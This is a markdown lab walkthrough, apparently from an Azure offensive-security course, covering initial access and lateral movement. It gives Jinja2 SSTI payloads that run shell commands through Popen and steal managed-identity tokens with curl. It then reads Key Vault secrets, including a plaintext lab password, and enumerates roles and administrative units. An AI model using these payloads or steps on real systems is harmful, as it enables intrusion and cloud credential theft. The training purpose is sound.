# Initial Access - SSTI

***Part of - Kill Chain - 2***

- [Detect SSTI Vulnerability on Azure App Service](#Part_I)
- [Lateral Movement via KeyVault Token](#Part_II)

# Part_I
## Initial Access via Compromised App Service Abuse with SSTI
<!---objective 11 -->
 ![test](/img/ssti.png "Initial Access via App Service Abuse")
 
In this application `Flask` is used as a framework. Flask is uses Jinja as a template engine

```java
{{7*7}}
{{config.items()}}
{{''.__class__.__mro__[1].__subclasses__()}}
```

**To find the right index of Popen, we can loop through all the classes and call the correct one. Use the following code, that runs the 'whoami' command using Popen:**

 ![test](/img/ssti_1.png "Initial Access via App Service Abuse")

```python
{% for x in ().__class__.__mro__[1].__subclasses__() %}
 {% if "Popen" in x.__name__ %}
 {{x('whoami',shell=True,stdout=-1).communicate()}}
 {% endif %}
{% endfor %}
```
We have root on the container/instance of the app service. Now, let's check the environment â€“ by using env command - to now if any managed identity is assigned to this app service. Recall that we need to check `IDENTITY_HEADER` and `IDENTITY_ENDPOINT` variables:

**Let's request the access token for the managed identity now using the following code:**
![test](/img/ssti_2.png "Initial Access via App Service Abuse")
![test](/img/ssti_3.png "Initial Access via App Service Abuse")
 
```python
{% for x in ().__class__.__mro__[1].__subclasses__() %}
  {% if "Popen" in x.__name__ %}
    {{x('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER',shell=True,stdout=-1).communicate()}}
  {% endif %}
{% endfor %}
```

```powershell
Connect-AzAccount -AccessToken $token 0AccountId $client_id
Get-AzResource
```

**Managed identity can access a key vault.**
![test](/img/ssti_4.png "Initial Access via App Service Abuse")

<!---objective 16 -->
# Part_II
## Lateral Movement

1. We need to `key vault` token and `access token`. We can get the down below python commands that can execute via `SSTI` vulnerability on the app.
    ```python
    {% for x in ().__class__.__mro__[1].__subclasses__() %}
      {% if "Popen" in x.__name__ %}
        {{x('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER',shell=True,stdout=-1).communicate()}}
      {% endif %}
    {% endfor %}
    ```

    ```python
    {% for x in ().__class__.__mro__[1].__subclasses__() %}
      {% if "Popen" in x.__name__ %}
        {{x('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com&api-version=2017-09-01" -H secret:$IDENTITY_HEADER',shell=True,stdout=-1).communicate()}}
      {% endif %}
    {% endfor %}
    ```
2. Connect via `Connect-AzAccount` 
    ```powershell
    $token = "eyJ0......"
    $keyvaulttoken = "eyJ0......"
    $account_id = "2e912......."
    Connect-AzAcoount -AccessToken $token -AccountId $account_id -KeyVaultAccessToken $keyvaulttoken
    ```
    Now check the key vault
    ```powershell
    Get-AzKeyVault
    Get-AzKeyVaultSecret -VaultName ResearchKeyVault
    Get-AzKeyVaultSecret -VaultName ResearchKeyVault -Name Reader -AsPlainText
    ```

    Connect via got keyvault secrets 
    ```powershell
    $passwd = ConvertTo-SecureString 'KaTH7#cvgdTest&^%0' -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential('kathynschaefer@defcorphq.onmicrosoft.com', $passwd)
    Connect-AzAccount -Credential $creds


    #List accessable Az Resource
    Get-AzResource
    ```

    Let's enumerate role assignments on the VM `jumpvm`:
    ```powershell
    Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/jumpvm
    ```

    There is a group `VM Admins` that has the `Virtual Machine Command Executor` role on the `jumpvm` VM. Check the definition of this role to understand the allowed actions.
    ```powershell
    Get-AzRoleDefinition -Name "Virtual Machine Command Executor"
    Get-AzADGroup -DisplayName 'VM Admins'
    Get-AzADGroupMember -GroupDisplayName 'VM Admins' | select UserPrincipalName
    ```

    Get an access token for Graph AP to add `VMContributorX@defcorphq.onmicrosoft.com` user to an administrative unit `Control Group`
    ```powershell
    (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com).Token
    ```

    User the token below code;
    ```powershell
    $Token = "eyJ0......"
    $URI = "https://graph.microsoft.com/v1.0/users/VMContributorX@defcorphq.onmicrosoft.com/memberof"
    $RequestParams = @{
      Method = 'GET'
      Uri = $URI
      Headers = @{
        'Authorization' = "Bearer $Token"
      }
    }

    #After successfuly defined variables execute below command;
    (Invoke-RestMethod @RequestParams).value
    ```

    Let's get information and membership of this administrative unit using Azure AD module. Use `Kathy's` credentials below;
    ```powershell
    Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
    Connect-AzureAD -Credential $creds
    Get-AzureADMSAdministrativeUnit -Id  e1e26d93-163e-42a2-a46e-1b7d52626395
    Get-AzureADMSScopeRoleMembership -Id  e1e26d93-163e-42a2-a46e-1b7d52626395 | fl *
    ```

    Let's check the role using the RoleId we got above;
    ```powershell
    Get-AzureADDirectoryRole -ObjectId  5b3935ed-b52d-4080-8b05-3a1832194d3a
    Get-AzureADUser -ObjectId 8c088359-66fb-4253-ad0da91b82fd548a | fl *
    ```